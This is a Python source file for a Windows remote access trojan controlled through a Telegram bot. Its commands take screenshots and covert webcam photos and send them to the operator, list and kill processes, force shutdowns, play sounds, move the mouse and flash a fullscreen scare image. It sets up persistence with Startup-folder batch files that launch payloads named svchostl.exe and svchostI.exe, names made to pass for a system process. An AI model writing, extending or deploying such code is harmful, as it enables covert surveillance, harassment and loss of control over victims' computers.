import telebot as tb
import config as cfg
import pyautogui as pag
import pyglet as pg
import ctypes
import cv2
import os
import sys
import socket as st
import random as ra
import psutil as pt
import getpass
from time import sleep
from tabulate import tabulate
from pynput.keyboard import Key, Controller
from PIL import Image, ImageTk
from pathlib import Path

if sys.version_info[0] == 2:
    import Tkinter
    tkinter = Tkinter
else:
    import tkinter


keyboard = Controller()
Volume = True
bot = tb.TeleBot(cfg.TOKEN)
player = pg.media.Player()
PCname = st.gethostname()
USER_NAME = getpass.getuser()


def showPIL(pilImage):
    root = tkinter.Tk()
    w, h = root.winfo_screenwidth(), root.winfo_screenheight()
    root.overrideredirect(1)
    root.geometry("%dx%d+0+0" % (w, h))
    root.focus_set()    
    root.bind("<Escape>", lambda e: (e.widget.withdraw(), e.widget.quit()))
    canvas = tkinter.Canvas(root,width=w,height=h)
    canvas.pack()
    canvas.configure(background='black')
    imgWidth, imgHeight = pilImage.size
    if imgWidth > w or imgHeight > h:
        ratio = min(w/imgWidth, h/imgHeight)
        imgWidth = int(imgWidth*ratio)
        imgHeight = int(imgHeight*ratio)
        pilImage = pilImage.resize((imgWidth,imgHeight), Image.ANTIALIAS)
    image = ImageTk.PhotoImage(pilImage)
    imagesprite = canvas.create_image(w/2,h/2,image=image)
    root.mainloop()

def add_to_startup_bot(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

    with open(bat_path + '\\' + "bot.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

def add_to_startup_watchdog(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))

    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "watchdog.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

@bot.message_handler(commands=["kill"])
def kill(message):
    killargument = message.text.split(maxsplit=1)[1]
    if cfg.LANGUAGE == 'RU':
    	bot.send_message(message.from_user.id, "Убиваем процесс. PID: " + str(killargument))
    elif cfg.LANGUAGE == 'EN':
    	bot.send_message(message.from_user.id, "Killing process. PID: " + str(killargument))
    os.kill(int(killargument), 9)

@bot.message_handler(commands=["check"])
def check(message):
	if cfg.LANGUAGE == 'RU':
		bot.send_message(message.from_user.id, "Компьютер: " + str(PCname) + " в сети!")
	elif cfg.LANGUAGE == 'EN':
		bot.send_message(message.from_user.id, "PC: " + str(PCname) + " online!")

@bot.message_handler(commands=["screen", "screenshot"])
def screen(message):
	screen = pag.screenshot()
	screen.save(r'C:\Windows\Temp\screen.png')
	sleep(0.5)
	bot.send_photo(message.from_user.id, photo=open('C:\Windows\Temp\screen.png', 'rb'))

@bot.message_handler(commands=["playsound", "ps"])
def playsound1(message):
	soundargument = message.text.split(maxsplit=1)[1]

	if int(soundargument) == 1:
		sound = pg.media.load(cfg.MUSIC1, streaming=False)
		player.queue(sound)
		player.play()
		sleep(cfg.DELAYMUSIC)
		player.pause()
		player.delete()

	elif int(soundargument) == 2:
		sound = pg.media.load(cfg.MUSIC2, streaming=False)
		player.queue(sound)
		player.play()
		sleep(cfg.DELAYMUSIC)
		player.pause()
		player.delete()

	elif int(soundargument) == 3:
		sound = pg.media.load(cfg.MUSIC3, streaming=False)
		player.queue(sound)
		player.play()
		sleep(cfg.DELAYMUSIC)
		player.pause()
		player.delete()

	else:
		if cfg.LANGUAGE == 'RU':
			bot.send_message(message.from_user.id, "Аргумент не найден! Попробуйте числа 1-3")
		elif cfg.LANGUAGE == 'EN':
			bot.send_message(message.from_user.id, "Argument not found! Try numbers 1-3")

@bot.message_handler(commands=["changewallpaper", "chw"])
def changewallpaper(message):
	chwarg = message.text.split(maxsplit=1)[1]
	if int(chwarg) == 1:
		ctypes.windll.user32.SystemParametersInfoW(20, 0, cfg.WALLPAPER1, 0)
	elif int(chwarg) == 2:
		ctypes.windll.user32.SystemParametersInfoW(20, 0, cfg.WALLPAPER2, 0)
	elif int(chwarg) == 3:
		ctypes.windll.user32.SystemParametersInfoW(20, 0, cfg.WALLPAPER3, 0)
	else:
		if cfg.LANGUAGE == 'RU':
			bot.send_message(message.from_user.id, "Аргумент не найден! Попробуйте числа 1-3")
		elif cfg.LANGUAGE == 'EN':
			bot.send_message(message.from_user.id, "Argument not found! Try numbers 1-3")

@bot.message_handler(commands=["volumemax"])
def volumemax(message):
	Volume = True

	while Volume:
		for i in range(50):
			keyboard.press(Key.media_volume_up)
			keyboard.release(Key.media_volume_up)
			i = i + 1
			sleep(0.1)

			if i == 50:
				if cfg.LANGUAGE == 'RU':
					bot.send_message(message.from_user.id, "Громкость увеличена!")
				elif cfg.LANGUAGE == 'EN':
					bot.send_message(message.from_user.id, "Volume up!")
				Volume = False
				i = 1

@bot.message_handler(commands=["volumemin"])
def volumemin(message):
	Volume = True

	while Volume:
		for i in range(50):
			keyboard.press(Key.media_volume_down)
			keyboard.release(Key.media_volume_down)
			i = i + 1
			sleep(0.1)

			if i == 50:
				if cfg.LANGUAGE == 'RU':
					bot.send_message(message.from_user.id, "Громкость уменьшена!")
				elif cfg.LANGUAGE == 'EN':
					bot.send_message(message.from_user.id, "Volume down!")
				Volume = False
				i = 1

@bot.message_handler(commands=["camera", "cam"])
def camera(message):
	cam = cv2.VideoCapture(0)
	cam.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
	cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
	ret, frame = cam.read()

	cv2.imwrite('C:\Windows\Temp\camera.png', frame)
	cam.release()
	sleep(0.5)
	bot.send_photo(message.from_user.id, photo=open('C:\Windows\Temp\camera.png', 'rb'))
	
@bot.message_handler(commands=["shutdown", "off"])
def shutdown(message):
	os.system("shutdown /s /t 0 /f")

@bot.message_handler(commands=["scream", "fullscreen"])
def scream(message):
	screamimage = Image.open(cfg.SCREAMIMAGENAME)
	showPIL(screamimage)

@bot.message_handler(commands=["movemouse", "mouse"])
def mouse(message):
	mousex = ra.randint(-1000, 1000)
	mousey = ra.randint(-1000, 1000)
	mousetime = ra.randint(1, 3)

	pag.moveRel(mousex, mousey, mousetime)
	sleep(0.5)
	bot.send_message(message.from_user.id, "MouseX: " + str(mousex) + " MouseY: " + str(mousey) + " MouseTime: " + str(mousetime) + " сек.")
	
@bot.message_handler(commands=["proc", "processes"])
def proc(message):
	llist = []
	process_list = pt.process_iter()
	for process in process_list:
			processname = process.name()
			processpid = process.pid
			processstatus = process.status()
			llist.append((
				processname,
				processpid,
				processstatus
				))

	table = tabulate(llist, headers=('Name', 'PID', 'Status'), tablefmt='grid')
	llist = None
	txt = open(str(PCname) + ".txt", "w")
	txt.write(str(table))
	txt.close()
	sleep(2)
	bot.send_document(message.from_user.id, document=open(str(PCname) + ".txt", "rb"))

@bot.message_handler(commands=["autostart", "as"])
def autostart(message):
	add_to_startup_bot("C:\Windows\Temp\svchostl.exe")
	add_to_startup_watchdog("C:\Windows\Temp\svchostI.exe")

while True:
	try:
		bot.polling(none_stop=True)
	except Exception as _ex:
		if cfg.LANGUAGE == 'RU':
			if cfg.DEBUG:
				bot.send_message(message.from_user.id, "Ошибка: " + str(_ex))
		elif cfg.LANGUAGE == 'EN':
			if cfg.DEBUG:
				bot.send_message(message.from_user.id, "Error: " + str(_ex))
		sleep(15)